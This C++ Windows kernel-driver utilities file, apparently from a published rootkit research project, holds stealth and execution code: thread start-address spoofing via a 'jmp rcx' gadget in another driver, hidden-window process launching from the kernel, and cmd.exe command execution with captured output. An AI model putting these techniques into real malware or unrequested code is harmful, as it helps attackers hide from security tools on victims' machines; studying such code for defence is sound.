/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "Utils.h"

PPROCESS_QUEUE Utilities::ProcessQueue;

/**
	Determine the address and size of a kernel module's next executable section.
	WARNING: Unsafe with modules that have pageable sections.
	@param ImageBase - Image base of the kernel module.
	@param ExecSectionBase - Caller-allocated variable to indicate the first section to start searching from and store the next executable section base.
	@param ExecSectionSize - Caller-allocated variable to store the next executable section size.
	@return Status of the section search.
*/
NTSTATUS
Utilities::FindNextExecSection (
	_In_ PVOID ImageBase,
	_Inout_ PVOID* ExecSectionBase,
	_Inout_ SIZE_T* ExecSectionSize
	)
{
	NTSTATUS status;
	PIMAGE_DOS_HEADER driverDosHeader;
	PIMAGE_NT_HEADERS_C driverNtHeader;
	PIMAGE_SECTION_HEADER driverSectionHeader;
	BOOLEAN foundStartSectionBase;
	ULONG i;
	PVOID currentSectionBase;

	status = STATUS_SUCCESS;
	*ExecSectionSize = 0;
	foundStartSectionBase = FALSE;

	//
	// Check if a starting section was specified. If not, return the first section.
	//
	if (*ExecSectionBase == NULL)
	{
		foundStartSectionBase = TRUE;
	}

	driverDosHeader = RCAST<PIMAGE_DOS_HEADER>(ImageBase);
	if (driverDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		DBGPRINT("Utilities!FindModuleTextSection: The image has an invalid DOS Header Magic value.");
		status = STATUS_INVALID_ADDRESS;
		goto Exit;
	}

	driverNtHeader = RCAST<PIMAGE_NT_HEADERS_C>(RCAST<ULONG_PTR>(driverDosHeader) + driverDosHeader->e_lfanew);
	if (driverNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		DBGPRINT("Utilities!FindModuleTextSection: The image has an invalid NT Header Magic value.");
		status = STATUS_INVALID_ADDRESS;
		goto Exit;
	}

	driverSectionHeader = IMAGE_FIRST_SECTION(driverNtHeader);

	//
	// Enumerate each section of the driver for the ".text" section.
	//
	for (i = 0; i < driverNtHeader->FileHeader.NumberOfSections; i++)
	{
		currentSectionBase = RCAST<PVOID>(RCAST<ULONG_PTR>(driverDosHeader) + driverSectionHeader[i].VirtualAddress);
		if (foundStartSectionBase == FALSE && currentSectionBase == *ExecSectionBase)
		{
			foundStartSectionBase = TRUE;
			continue;
		}
		else if (foundStartSectionBase && FlagOn(driverSectionHeader[i].Characteristics, IMAGE_SCN_MEM_EXECUTE))
		{
			*ExecSectionBase = currentSectionBase;
			*ExecSectionSize = driverSectionHeader[i].SizeOfRawData;
			break;
		}
	}
Exit:
	return status;
}

/**
	Search for a Pattern of bytes that match the Mask.
	@param Address - The address to begin the search at.
	@param Length - The number of bytes to compare.
	@param Pattern - The pattern to match.
	@param Mask - The mask to apply to the pattern.
	@return NULL if not found. Otherwise, a pointer to the first match.
*/
PVOID
Utilities::FindPattern (
	_In_ CONST PVOID Address,
	_In_ CONST SIZE_T Length,
	_In_ CONST CHAR* Pattern,
	_In_ CONST CHAR* Mask
	)
{
	for (auto i = 0; i < Length; i++)
		if (Utilities::CompareData(RCAST<CONST CHAR*>(RCAST<ULONG_PTR>(Address) + i), Pattern, Mask))
			return RCAST<PVOID>(RCAST<ULONG_PTR>(Address) + i);
	return NULL;
}

/**
	Compare data against a pattern and mask.
	@param Data - The data to compare.
	@param Pattern - The pattern to compare against.
	@param Mask - The mask to apply to the pattern.
	@return Whether or not the data fits the pattern and mask.
*/
BOOLEAN
Utilities::CompareData (
	_In_ CONST CHAR* Data,
	_In_ CONST CHAR* Pattern,
	_In_ CONST CHAR* Mask
	)
{
	for (; *Mask; ++Mask, ++Data, ++Pattern)
		if (*Mask == 'x' && *Data != *Pattern)
			return FALSE;
	return (*Mask) == 0;
}

/**
	Enumerate executable sections in ImpersonateDriver and find a "jmp rcx" gadget.
	If found, create a new thread at that gadget location, to spoof the start address of the thread.
	Set the first argument (rcx register) passed to the thread to be the actual thread function, which the gadget will jump to.
*/
BOOLEAN
Utilities::CreateHiddenThread (
	_In_ PVOID DriverBase,
	_In_ PVOID ThreadFunction
	)
{
	NTSTATUS status;
	HANDLE threadHandle;
	PVOID jmpRcxGadget;
	PVOID currentExecutableSection;
	SIZE_T currentExecutableSectionSize;

	jmpRcxGadget = NULL;
	currentExecutableSection = NULL;
	currentExecutableSectionSize = 0;

	//
	// Enumerate each executable of the ImpersonateDriver to look for a "jmp rcx" (0xFF, 0xE1) gadget.
	//
	while (NT_SUCCESS(Utilities::FindNextExecSection(DriverBase, &currentExecutableSection, &currentExecutableSectionSize)) && jmpRcxGadget == NULL)
	{
		NT_ASSERT(currentExecutableSection);
		jmpRcxGadget = FindPattern(currentExecutableSection, currentExecutableSectionSize, "\xFF\xE1", "xx");
	}

	//
	// Check if we were able to find a gadget.
	//
	if (jmpRcxGadget == NULL)
	{
		DBGPRINT("Utilities!CreateHiddenThread: Failed to find a \"jmp rcx\" gadget in the driver.");
		return FALSE;
	}

	//
	// Create a system thread on the "jmp rcx" gadget with the actual thread function as the first argument (rcx register).
	//
	status = PsCreateSystemThread(&threadHandle, 0, NULL, 0, NULL, RCAST<PKSTART_ROUTINE>(jmpRcxGadget), ThreadFunction);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!CreateHiddenThread: Failed to create system thread with status 0x%X.", status);
		return FALSE;
	}
	
	ZwClose(threadHandle);
	return TRUE;
}

/**
	Get the system module information for a module specified by the name ModuleName.
	@param ModuleName - The name of the target system module.
	@return The target system module information. Will be empty if not found.
*/
CONST RTL_PROCESS_MODULE_INFORMATION
Utilities::GetDriverModule (
	_In_ CONST CHAR* ModuleName
	)
{
	NTSTATUS status;
	RTL_PROCESS_MODULE_INFORMATION driverModuleInformation;
	RTL_PROCESS_MODULE_INFORMATION currentModule;
	PRTL_PROCESS_MODULES systemModuleList;
	ULONG neededSize;
	ULONG i;

	memset(&driverModuleInformation, 0, sizeof(driverModuleInformation));
	neededSize = 0;

	//
	// Query the bytes required to query system modules.
	//
	ZwQuerySystemInformation(SystemModuleInformation, &neededSize, 0, &neededSize);

	//
	// Allocate space for modules.
	//
	systemModuleList = RCAST<PRTL_PROCESS_MODULES>(ExAllocatePoolWithTag(NonPagedPoolNx, neededSize, SYSTEM_MODULE_INFO_TAG));
	if (systemModuleList == NULL)
	{
		DBGPRINT("Utilities!GetDriverModule: Failed to allocate space for system module list.");
		status = STATUS_NO_MEMORY;
		goto Exit;
	}

	//
	// Query the system modules.
 	//
	status = ZwQuerySystemInformation(SystemModuleInformation, systemModuleList, neededSize, NULL);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!GetDriverModule: Failed to query the system module list with status 0x%X.", status);
		goto Exit;
	}

	//
	// Enumerate each system module for a match.
	//
	for (i = 0; i < systemModuleList->NumberOfModules; i++)
	{
		currentModule = systemModuleList->Modules[i];
		if(strstr(RCAST<CONST CHAR*>(currentModule.FullPathName), ModuleName) != NULL)
		{
			driverModuleInformation = currentModule;
			break;
		}
	}
Exit:
	if (NT_SUCCESS(status) == FALSE && systemModuleList)
	{
		ExFreePoolWithTag(systemModuleList, SYSTEM_MODULE_INFO_TAG);
	}
	return driverModuleInformation;
}

/**
	Reimplemented ZwCreateNamedPipeFile.
*/
NTSTATUS
ZwCreateNamedPipeFile (
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_ ULONG NamedPipeType,
	_In_ ULONG ReadMode,
	_In_ ULONG CompletionMode,
	_In_ ULONG MaxInstances,
	_In_ ULONG InBufferSize,
	_In_ ULONG OutBufferSize,
	_In_ PLARGE_INTEGER DefaultTimeout
	)
{
	NAMED_PIPE_CREATE_PARAMETERS namedPipeCreateParams;

	//
	// Fill out the create parameters.
	//
	namedPipeCreateParams.NamedPipeType = NamedPipeType;
	namedPipeCreateParams.ReadMode = ReadMode;
	namedPipeCreateParams.CompletionMode = CompletionMode;
	namedPipeCreateParams.MaximumInstances = MaxInstances;
	namedPipeCreateParams.InboundQuota = InBufferSize;
	namedPipeCreateParams.OutboundQuota = OutBufferSize;
	namedPipeCreateParams.TimeoutSpecified = FALSE;

	if (DefaultTimeout)
	{
		namedPipeCreateParams.DefaultTimeout = *DefaultTimeout;
		namedPipeCreateParams.TimeoutSpecified = TRUE;
	}
	
	//
	// Create the named pipe.
	//
	return IoCreateFile(FileHandle,
						DesiredAccess,
						ObjectAttributes,
						IoStatusBlock,
						NULL,
						0,
						ShareAccess,
						CreateDisposition,
						CreateOptions,
						NULL,
						0,
						CreateFileTypeNamedPipe,
						&namedPipeCreateParams,
						0);
}


/**
	Creates an unnamed pipe for reading/writing. Quite literally just reversed CreatePipe in kernelbase.dll.
	@param hReadPipe - Pointer to a HANDLE that will receive a READ handle to the new pipe.
	@param hWritePipe - Pointer to a HANDLE that will receive a WRITE handle to the new pipe.
	@return Status of creating the new pipe.
*/
NTSTATUS
Utilities::CreatePipe (
	_Inout_ PHANDLE hReadPipe,
	_Inout_ PHANDLE hWritePipe
	)
{
	NTSTATUS status;
	HANDLE namedPipeDirectory;
	OBJECT_ATTRIBUTES rootNamedPipeAttributes;
	UNICODE_STRING namedPipePath;
	IO_STATUS_BLOCK statusBlock;

	OBJECT_ATTRIBUTES newNamedPipeAttributes;
	HANDLE newPipeReadHandle;
	HANDLE newPipeWriteHandle;
	LARGE_INTEGER defaultTimeout;

	namedPipeDirectory = NULL;
	newPipeReadHandle = NULL;
	newPipeWriteHandle = NULL;
	defaultTimeout.QuadPart = -1200000000;
	*hReadPipe = NULL;
	*hWritePipe = NULL;

	RtlInitUnicodeString(&namedPipePath, L"\\Device\\NamedPipe\\");

	InitializeObjectAttributes(&rootNamedPipeAttributes, &namedPipePath, 0, NULL, NULL);
	
	//
	// Open the root NamedPipe directory.
	//
	status = ZwOpenFile(&namedPipeDirectory, GENERIC_READ | SYNCHRONIZE, &rootNamedPipeAttributes, &statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!CreatePipe: Failed to open root NamedPipe directory with status 0x%X.", status);
		goto Exit;
	}

	//
	// We are creating an unnamed pipe, so set the UNICODE_STRING buffer/length to NULL.
	//
	namedPipePath.Buffer = NULL;
	namedPipePath.Length = 0;

	//
	// For the new NamedPipe root directory, we pass the handle for the
	// root NamedPipe directory since we don't specify an object name.
	//
	InitializeObjectAttributes(&newNamedPipeAttributes, &namedPipePath, OBJ_CASE_INSENSITIVE | OBJ_INHERIT, namedPipeDirectory, NULL);

	//
	// Create the new pipe.
	//
	status = ZwCreateNamedPipeFile(&newPipeReadHandle,
								   GENERIC_READ | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES,
								   &newNamedPipeAttributes,
								   &statusBlock,
								   FILE_SHARE_READ | FILE_SHARE_WRITE,
								   FILE_CREATE,
								   FILE_SYNCHRONOUS_IO_NONALERT,
								   FILE_PIPE_BYTE_STREAM_TYPE,
								   FILE_PIPE_BYTE_STREAM_MODE,
								   FILE_PIPE_QUEUE_OPERATION,
								   1,
								   0x1000,
								   0x1000,
								   &defaultTimeout);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!CreatePipe: Failed to create pipe with status 0x%X.", status);
		goto Exit;
	}

	DBGPRINT("Utilities!CreatePipe: newPipeReadHandle = 0x%X.", newPipeReadHandle);

	//
	// This time the root directory is our handle to the new pipe.
	// We need to open a write handle next.
	//
	InitializeObjectAttributes(&newNamedPipeAttributes, &namedPipePath, OBJ_CASE_INSENSITIVE | OBJ_INHERIT, newPipeReadHandle, NULL);

	//
	// Open the write handle to the pipe.
	//
	status = ZwOpenFile(&newPipeWriteHandle,
						GENERIC_WRITE | SYNCHRONIZE | FILE_READ_ATTRIBUTES,
						&newNamedPipeAttributes,
						&statusBlock,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!CreatePipe: Failed to open pipe for writing with status 0x%X.", status);
		goto Exit;
	}

	//
	// Set the output handles to the new pipe handles.
	//
	*hReadPipe = newPipeReadHandle;
	*hWritePipe = newPipeWriteHandle;
Exit:
	if (namedPipeDirectory)
	{
		ZwClose(namedPipeDirectory);
	}
	if (NT_SUCCESS(status) == FALSE)
	{
		if (newPipeReadHandle)
		{
			ZwClose(newPipeReadHandle);
		}
		if (newPipeWriteHandle)
		{
			ZwClose(newPipeWriteHandle);
		}
	}
	return status;
}

/**
	Attempt to retrieve the number of pending bytes for a pipe.
	@param hNamedPipe - Handle to the pipe.
	@param AvailableReadBytes - The number of bytes pending on the pipe.
	@return If the query was successful, STATUS_SUCCESS.
*/
NTSTATUS
Utilities::PeekNamedPipe (
	_In_ HANDLE hNamedPipe,
	_In_ PULONG AvailableReadBytes
	)
{
	NTSTATUS status;
	FILE_PIPE_PEEK_BUFFER peekBuffer;
	IO_STATUS_BLOCK statusBlock;

	memset(&peekBuffer, 0, sizeof(peekBuffer));
	
	//
	// Send a peek request.
	//
	status = ZwFsControlFile(hNamedPipe,
							 NULL,
							 NULL,
							 NULL,
							 &statusBlock,
							 FSCTL_PIPE_PEEK,
							 NULL,
							 0,
							 &peekBuffer,
							 sizeof(peekBuffer));
	if (status == STATUS_PENDING)
	{
		status = ZwWaitForSingleObject(hNamedPipe, FALSE, NULL);
		if (NT_SUCCESS(status))
		{
			status = statusBlock.Status;
		}
	}

	//
	// Set the number of bytes available to read.
	//
	*AvailableReadBytes = peekBuffer.ReadDataAvailable;
	return status;
}

/**
	Copies a string into a process parameter structure.
	@param ProcessParameters - Pointer to the process parameter structure we're editing.
	@param NormalizedOffset - Offset of where to put the Source string. Should be greater than sizeof(RTL_USER_PROCESS_PARAMETERS) since buffers are placed after the main structure.
	@param TargetParameter - The target UNICODE_STRING structure to update.
	@param Source - The source string.
*/
VOID
CopyParameterUnicodeString (
	_Inout_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
	_In_ ULONG NormalizedOffset,
	_In_ PUNICODE_STRING TargetParameter,
	_In_ PUNICODE_STRING Source
	)
{
	//
	// Copy the original unicode string.
	//
	memcpy(TargetParameter, Source, sizeof(UNICODE_STRING));

	//
	// Calculate the buffer to copy the source buffer to.
	//
	TargetParameter->Buffer = RCAST<PWCH>(RCAST<ULONG64>(ProcessParameters) + NormalizedOffset);

	//
	// Copy the source string.
	//
	memcpy(RCAST<PVOID>(TargetParameter->Buffer), Source->Buffer, Source->Length);
}

/**
	Start a user-mode process.
	@param CurrentDirectory - The current directory of the new process.
	@param ProcessImageName - The path of the new process.
	@param CommandLine - The command line arguments for the new process.
	@param Timeout - How long to wait for the process to exit (in milliseconds).
	@param StdOutHandle - An optional HANDLE to redirect StdOut and StdErr to.
	@return Status of process creation.
*/
NTSTATUS
Utilities::StartProcess (
	_In_ PUNICODE_STRING CurrentDirectory,
	_In_ PUNICODE_STRING ProcessImageName,
	_In_ PUNICODE_STRING CommandLine,
	_In_ CONST LONG Timeout,
	_In_opt_ PHANDLE StdOutHandle
	)
{
	NTSTATUS status;
	HANDLE processHandle;
	HANDLE threadHandle;

	ULONG attrListCount;
	ULONG attrListSize;
	PPS_ATTRIBUTE_LIST attrList;

	UNICODE_STRING defaultDesktop;
	ULONG userParamsSize;
	PRTL_USER_PROCESS_PARAMETERS userParams;
	ULONG currentParamsOffset;

	PS_CREATE_INFO createInfo;
	LARGE_INTEGER timeout;

	NtFunctionResolver* ntFunctionResolver;
	static ZwCreateUserProcess_t ZwCreateUserProcess = NULL;
	ULONG syscallNumber;

	UNICODE_STRING dllPathUnicode;

	CONST WCHAR DllPath[] = L"C:\\Windows\\system32;;C:\\Windows\\system32;C:\\Windows\\system;C:\\Windows;.;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\";

	memset(&createInfo, 0, sizeof(createInfo));

	status = STATUS_NO_MEMORY;
	processHandle = NULL;
	threadHandle = NULL;
	attrList = NULL;
	userParams = NULL;
	ntFunctionResolver = NULL;

	RtlInitUnicodeString(&dllPathUnicode, DllPath);

	if (ZwCreateUserProcess == NULL)
	{
		ntFunctionResolver = new (NonPagedPool, NT_FUNCTION_RESOLVER_TAG) NtFunctionResolver();
		
		//
		// Load the ntdll module from disk.
		//
		status = ntFunctionResolver->LoadNtdllModule();
		if (NT_SUCCESS(status) == FALSE)
		{
			DBGPRINT("Utilities!StartProcess: Failed to load ntdll.");
			goto Exit;
		}

		//
		// Find the system call number for NtCreateUserProcess.
		//
		syscallNumber = ntFunctionResolver->FindExportSyscall("NtCreateUserProcess");
		if (syscallNumber == -1)
		{
			DBGPRINT("Utilities!StartProcess: Failed to find system call.");
			goto Exit;
		}

		//
		// Find ZwCreateUserProcess via its system call number.
		//
		ZwCreateUserProcess = RCAST<ZwCreateUserProcess_t>(ntFunctionResolver->FindSyscallZwFunction(syscallNumber));
		if (ZwCreateUserProcess == NULL)
		{
			DBGPRINT("Utilities!StartProcess: Failed to find ZwCreateUserProcess.");
			NT_ASSERT(FALSE);
			goto Exit;
		}

		DBGPRINT("Utilities!StartProcess: ZwCreateUserProcess = 0x%llx.", ZwCreateUserProcess);
	}
	
	//
	// Sanity checks.
	//
	if(CurrentDirectory == NULL ||
	   CurrentDirectory->Buffer == NULL ||
	   CommandLine == NULL ||
	   CommandLine->Buffer == NULL ||
	   ProcessImageName == NULL ||
	   ProcessImageName->Buffer == NULL)
	{
		DBGPRINT("Utilities!StartProcess: NULL SANITY CHECK TRIGGERED.");
		NT_ASSERT(FALSE);
		goto Exit;
	}

	//
	// Initialize the default Window station string.
	//
	RtlInitUnicodeString(&defaultDesktop, L"Winsta0\\Default");

	//
	// Relative time is negative.
	//
	timeout.QuadPart = -MILLISECONDS_TO_SYSTEMTIME(Timeout);

	//
	// Set the attributes for the process.
	// If an StdOut handle is specified, we have three attributes.
	//
	attrListCount = 1;
	//if (StdOutHandle)
	//{
	//	attrListCount = 2;
	//}
	attrListSize = sizeof(PS_ATTRIBUTE_LIST) + ((attrListCount-1) * sizeof(PS_ATTRIBUTE));
	attrList = RCAST<PPS_ATTRIBUTE_LIST>(ExAllocatePoolWithTag(NonPagedPool, attrListSize, PROCESS_ATTRIBUTES_TAG));
	if (attrList == NULL)
	{
		DBGPRINT("Utilities!StartProcess: Failed to allocate memory for process attributes.");
		goto Exit;
	}
	memset(attrList, 0, attrListSize);

	//
	// Set the image name.
	//
	attrList->TotalLength = attrListSize;
	attrList->Attributes[0].Attribute = PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE);
	attrList->Attributes[0].Size = ProcessImageName->Length;
	attrList->Attributes[0].Value = RCAST<ULONG_PTR>(ProcessImageName->Buffer);

	//
	// Set the fake parent process.
	//
	//attrList->Attributes[1].Attribute = PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE);
	//attrList->Attributes[1].Size = sizeof(HANDLE);
	//attrList->Attributes[1].Value = RCAST<ULONG_PTR>(ParentProcess);

	//
	// Set the StdOut handle.
	//
	//if (StdOutHandle)
	//{
	//	attrList->Attributes[1].Attribute = PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE);
	//	attrList->Attributes[1].Size = sizeof(BOOLEAN);
	//	attrList->Attributes[1].Value = 1;
	//}

	//
	// Calculate the size necessary for the parameters.
	//
	userParamsSize = sizeof(RTL_USER_PROCESS_PARAMETERS);
	userParamsSize += ALIGN(CurrentDirectory->Length + sizeof(WCHAR), sizeof(ULONG));
	userParamsSize += ALIGN(CommandLine->Length + sizeof(WCHAR), sizeof(ULONG));
	userParamsSize += ALIGN(ProcessImageName->Length + sizeof(WCHAR), sizeof(ULONG));
	userParamsSize += ALIGN(defaultDesktop.Length + sizeof(WCHAR), sizeof(ULONG));
	userParamsSize += ALIGN(dllPathUnicode.Length + sizeof(WCHAR), sizeof(ULONG));

	//
	// Allocate space for the parameters.
	//
	userParams = RCAST<PRTL_USER_PROCESS_PARAMETERS>(ExAllocatePoolWithTag(NonPagedPool, userParamsSize, PROCESS_PARAMETERS_TAG));
	if (userParams == NULL)
	{
		DBGPRINT("Utilities!StartProcess: Failed to allocate memory for process parameters.");
		goto Exit;
	}
	memset(userParams, 0, userParamsSize);

	//
	// Set standard structure members.
	//
	userParams->Length = userParamsSize;
	userParams->MaximumLength = userParamsSize;
	userParams->Flags = RTL_USER_PROCESS_PARAMETERS_NORMALIZED;

	//
	// Hide the window.
	//
	userParams->WindowFlags = STARTF_USESHOWWINDOW;
	if (StdOutHandle)
	{
		userParams->WindowFlags |= STARTF_USESTDHANDLES;
		userParams->StandardOutput = *StdOutHandle;
		//userParams->StandardError = *StdOutHandle;
	}
	userParams->ShowWindowFlags = 0;

	//
	// Copy the unicode strings over and normalize.
	//
	currentParamsOffset = sizeof(RTL_USER_PROCESS_PARAMETERS);

	//
	// Copy the current directory.
	//
	CopyParameterUnicodeString(userParams, currentParamsOffset, &userParams->CurrentDirectory.DosPath, CurrentDirectory);
	currentParamsOffset += ALIGN(CurrentDirectory->Length + sizeof(WCHAR), sizeof(ULONG));

	//
	// Copy the command line.
	//
	CopyParameterUnicodeString(userParams, currentParamsOffset, &userParams->CommandLine, CommandLine);
	currentParamsOffset += ALIGN(CommandLine->Length + sizeof(WCHAR), sizeof(ULONG));

	//
	// Copy the process image path.
	//
	CopyParameterUnicodeString(userParams, currentParamsOffset, &userParams->ImagePathName, ProcessImageName);
	currentParamsOffset += ALIGN(ProcessImageName->Length + sizeof(WCHAR), sizeof(ULONG));

	//
	// Copy the default desktop.
	//
	CopyParameterUnicodeString(userParams, currentParamsOffset, &userParams->DesktopInfo, &defaultDesktop);
	currentParamsOffset += ALIGN(defaultDesktop.Length + sizeof(WCHAR), sizeof(ULONG));
	
	//
	// Copy the DLL path.
	//
	CopyParameterUnicodeString(userParams, currentParamsOffset, &userParams->DllPath, &dllPathUnicode);
	currentParamsOffset += ALIGN(dllPathUnicode.Length + sizeof(WCHAR), sizeof(ULONG));

	//
	// We don't really need to use Create Info so just set the size.
	//
	createInfo.Size = sizeof(createInfo);

	//
	// Create the process.
	//
	status = ZwCreateUserProcess(&processHandle, &threadHandle, PROCESS_ALL_ACCESS, THREAD_RESUME, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, userParams, &createInfo, attrList);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!StartProcess: Failed to create process with status 0x%X.", status);
		goto Exit;
	}

	DBGPRINT("Utilities!StartProcess: Process created 0x%X, waiting %i seconds.", processHandle, (Timeout / 1000));

	//
	// Wait for Timeout milliseconds.
	//
	status = ZwWaitForSingleObject(processHandle, FALSE, &timeout);
	if (status == STATUS_TIMEOUT)
	{
		DBGPRINT("Utilities!StartProcess: Process still running, terminating.");

		//
		// If the process did not fulfill the timeout, we need to terminate it.
		//
		status = ZwTerminateProcess(processHandle, STATUS_SUCCESS);
		if (NT_SUCCESS(status) == FALSE)
		{
			DBGPRINT("Utilities!StartProcess: Failed to terminate process with status 0x%X.", status);
			goto Exit;
		}
	}

	DBGPRINT("Utilities!StartProcess: Process ended.");

Exit:
	if (processHandle)
	{
		ZwClose(processHandle);
	}
	if (threadHandle)
	{
		ZwClose(threadHandle);
	}
	if (attrList)
	{
		ExFreePoolWithTag(attrList, PROCESS_ATTRIBUTES_TAG);
	}
	if (userParams)
	{
		ExFreePoolWithTag(userParams, PROCESS_PARAMETERS_TAG);
	}
	if (ntFunctionResolver)
	{
		ExFreePoolWithTag(ntFunctionResolver, SYSTEM_MODULE_INFO_TAG);
	}
	return status;
}

/**
	Run a command through cmd.
	@param ProcessQueue - The process queue to queue the new process into.
	@param Command - The command to run.
	@param CommandSize - The size of the Command buffer in bytes.
	@param Timeout - How long to wait for the process to exit (in milliseconds).
	@param OutputBuffer - The buffer to put the command output in.
	@param OutputBufferSize - The size of the output buffer. Updated with the number of bytes returned by the command.
	@return The status of the execution.
*/
NTSTATUS
Utilities::RunCommand (
	_In_ WCHAR* Command,
	_In_ ULONG CommandSize,
	_In_ LONG Timeout,
	_Inout_ BYTE* OutputBuffer,
	_Inout_ ULONG* OutputBufferSize
	)
{
	NTSTATUS status;

	CONST WCHAR* commandLineBase = L"cmd.exe /c ";

	PEPROCESS parentEprocess;
	BOOLEAN attachedProcess;

	OBJECT_ATTRIBUTES completionEventAttributes;
	PROCESS_QUEUE_INFO queueInfo;
	PPROCESS_QUEUE_INFO listQueueInfo;
	LARGE_INTEGER eventTimeout;

	UNICODE_STRING completionEventName;

	RtlInitUnicodeString(&queueInfo.ProcessImageName, L"\\??\\C:\\Windows\\System32\\cmd.exe");
	RtlInitUnicodeString(&queueInfo.CurrentDirectory, L"C:\\Windows\\System32\\");
	RtlInitUnicodeString(&completionEventName, NULL);

	parentEprocess = NULL;
	attachedProcess = FALSE;
	listQueueInfo = NULL;

	//
	// Relative time is negative.
	//
	eventTimeout.QuadPart = -MILLISECONDS_TO_SYSTEMTIME(Timeout);

	//
	// Allocate space for the command line arguments.
	//
	queueInfo.Arguments.MaximumLength = SCAST<USHORT>((wcslen(commandLineBase) * sizeof(WCHAR)) + CommandSize + sizeof(ULONG_PTR));
	queueInfo.Arguments.Length = 0;
	queueInfo.Arguments.Buffer = RCAST<PWCH>(ExAllocatePoolWithTag(NonPagedPool, queueInfo.Arguments.MaximumLength, PROCESS_CMDLINE_TAG));
	if (queueInfo.Arguments.Buffer == NULL)
	{
		DBGPRINT("Utilities!RunCommand: Failed allocate memory for command line arguments.");
		status = STATUS_NO_MEMORY;
		goto Exit;
	}
	memset(queueInfo.Arguments.Buffer, 0, queueInfo.Arguments.MaximumLength);

	//
	// Set the command line base prefix.
	//
	status = RtlUnicodeStringCatString(&queueInfo.Arguments, commandLineBase);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!RunCommand: Failed to concatenate base command line argument with status 0x%X.", status);
		goto Exit;
	}

	//
	// Append the actual command line argumemnts.
	//
	status = RtlUnicodeStringCatString(&queueInfo.Arguments, Command);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!RunCommand: Failed to concatenate command line argument with status 0x%X, length %i, and max length %i.", status, queueInfo.Arguments.Length, queueInfo.Arguments.MaximumLength);
		goto Exit;
	}

	DBGPRINT("Utilities!RunCommand: Final command line arguments are %wZ.", queueInfo.Arguments);


	////
	//// Open the parent process.
	////
	//status = ObReferenceObjectByHandle(ParentProcess, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, RCAST<PVOID*>(&parentEprocess), NULL);
	//if (NT_SUCCESS(status) == FALSE)
	//{
	//	DBGPRINT("Utilities!RunCommand: Failed to open the parent process with status 0x%X.", status);
	//	goto Exit;
	//}

	//if (ParentProcess != NULL)
	//{
	//	//
	//	// Attach to the parent process.
	//	//
	//	KeStackAttachProcess(parentEprocess, &oldState);
	//	attachedProcess = TRUE;
	//}

	InitializeObjectAttributes(&completionEventAttributes, &completionEventName, OBJ_KERNEL_HANDLE, NULL, NULL);

	//
	// Create the event responsible signaled after the process has neded.
	//
	status = ZwCreateEvent(&queueInfo.CompletionEvent, EVENT_ALL_ACCESS, &completionEventAttributes, NotificationEvent, FALSE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!RunCommand: Failed to create completion event with status 0x%X.", status);
		goto Exit;
	}

	//
	// Fill out basic information to queue the process.
	//
	queueInfo.Timeout = Timeout;
	queueInfo.OutputBuffer = OutputBuffer;
	queueInfo.OutputBufferSize = OutputBufferSize;

	//
	// Queue the actual process.
	//
	listQueueInfo = ProcessQueue->PushProcess(&queueInfo);

	DBGPRINT("Utilities!RunCommand: Queued event.");

	//
	// Wait for the completion event to be signaled.
	//
	status = ZwWaitForSingleObject(listQueueInfo->CompletionEvent, TRUE, &eventTimeout);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!RunCommand: Failed to wait for queue event with status 0x%X.", status);
		goto Exit;
	}

	status = listQueueInfo->ResultStatus;
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("Utilities!RunCommand: Failed to execute command with status 0x%X.", status);
		goto Exit;
	}

	////
	//// Actually start the process.
	////
	//status = Utilities::StartProcess(&queueInfo.CurrentDirectory, &queueInfo.ProcessImageName, &queueInfo.Arguments, Timeout, &pipeWriteHandle);
	//if (NT_SUCCESS(status) == FALSE)
	//{
	//	DBGPRINT("Utilities!RunCommand: Failed to create the cmd process with status 0x%X.", status);
	//	goto Exit;
	//}
	DBGPRINT("Utilities!RunCommand: Read %i bytes: %s.", *listQueueInfo->OutputBufferSize, listQueueInfo->OutputBuffer);
Exit:
	//if (attachedProcess)
	//{
	//	KeUnstackDetachProcess(&oldState);
	//}
	if (listQueueInfo)
	{
		if (listQueueInfo->CompletionEvent)
		{
			ZwClose(listQueueInfo->CompletionEvent);
		}
		ProcessQueue->FreeProcess(listQueueInfo);
	}
	//if (parentEprocess)
	//{
	//	KeUnstackDetachProcess(&oldState);
	//	ObDereferenceObject(parentEprocess);
	//}
	if (queueInfo.Arguments.Buffer)
	{
		ExFreePoolWithTag(queueInfo.Arguments.Buffer, PROCESS_CMDLINE_TAG);
	}
	return status;
}

/**
	Convert a virtual address to a raw file offset.
	@param NtHeaders - The NT headers for the module.
	@param SectionHeader - The first section header of the module.
	@param VirtualAddress - The virtual address to convert.
